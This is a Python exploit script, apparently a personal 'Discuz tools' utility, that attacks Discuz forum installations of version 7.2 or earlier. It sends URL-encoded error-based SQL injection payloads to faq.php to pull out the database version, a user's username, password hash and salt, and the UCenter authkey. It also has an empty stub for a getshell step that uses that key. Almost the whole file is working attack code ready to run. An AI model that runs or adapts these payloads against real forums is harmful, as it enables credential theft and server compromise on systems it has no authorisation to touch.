# !/usr/bin/env python
# coding  : utf-8
# Date    : 2018-04-08 16:11:30
# Author  : b4zinga
# Email   : b4zinga@outlook.com
# Function: Discuz tools

import requests
import re


class Discuz:
    def __init__(self, url):
        if '://' not in url:
            url = 'http://' + url
        self.url = url.strip('/')

    @staticmethod
    def getInfo(text):
        regex = "Duplicate entry '(.*?)'"
        items = re.findall(regex, text)
        if items:
            return items[0]
        else:
            return "Can't found..."

    def faqSql(self):
        """Version:  <= 7.2
        dz faq.php sql vuln
        """
        payload_db_version = '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema%20.tables%20group%20by%20x)a)%23'
        req = requests.get(self.url+payload_db_version)
        print('[+] Discuz faq.php sql vulnerable ~ ')
        print('[+] MySql version: '+self.getInfo(req.text))

        payload_get_user_pwd_salt = '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%28username,0x3a,password,0x3a,salt%29%20from%20cdb_uc_members%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23'
        req = requests.get(self.url+payload_get_user_pwd_salt)
        print('[+] username:password:salt ~ '+self.getInfo(req.text))

        payload_get_key1 = '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x3a,(select%20substr(authkey,1,62)%20from%20cdb_uc_applications%20limit%200,1),0x3a)x%20from%20information_schema.tables%20group%20by%20x)a)%23'
        payload_get_key2 = '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x3a,(select%20substr(authkey,63,64)%20from%20cdb_uc_applications%20limit%200,1),0x3a)x%20from%20information_schema.tables%20group%20by%20x)a)%23'

        req1 = requests.get(self.url+payload_get_key1)
        req2 = requests.get(self.url+payload_get_key2)

        uck = self.getInfo(req1.text)[2:]+self.getInfo(req2.text)[2:-1]

        print('[+] uc_key: '+uck)  # 62 + 2

    def ucKeyGetShell(self):
        """uc_key getshell"""
        """refer: https://www.waitalone.cn/discuz-uc_key-getshell.html"""
        pass


if __name__ == '__main__':
    dz = Discuz(url='192.168.1.133:81')
    dz.faqSql()
